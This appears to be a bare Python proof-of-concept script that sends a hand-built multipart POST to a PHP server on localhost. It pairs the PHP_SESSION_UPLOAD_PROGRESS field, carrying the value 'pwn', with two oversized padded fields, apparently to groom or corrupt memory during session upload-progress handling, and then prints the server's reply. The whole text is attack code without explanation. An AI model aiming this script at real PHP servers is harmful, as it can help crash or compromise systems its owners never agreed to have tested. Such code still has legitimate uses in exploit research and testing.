#!/usr/bin/env python3
import socket
HOST='127.0.0.1'; PORT=8088; SID=b'bgsmall123'; BND=b'BNDRY12345'
def mp(parts,b):
    o=bytearray()
    for p in parts:
        o+=b'--'+b+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
    o+=b'--'+b+b'--\r\n'; return bytes(o)
p1=bytearray(b'A'*8214); p2=bytearray(b'B'*8214); p1[0:8]=b'\x41'*8; p2[0:8]=b'\x42'*8
body=mp([{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},{'name':'p1','data':bytes(p1)},{'name':'p2','data':bytes(p2)}],BND)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=30); s.settimeout(30)
try: s.sendall(h+body)
except OSError as e: print('send err',e)
d=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        d+=c
except OSError as e: print('recv err',e)
s.close()
print(d[:400].decode('latin1','replace'))
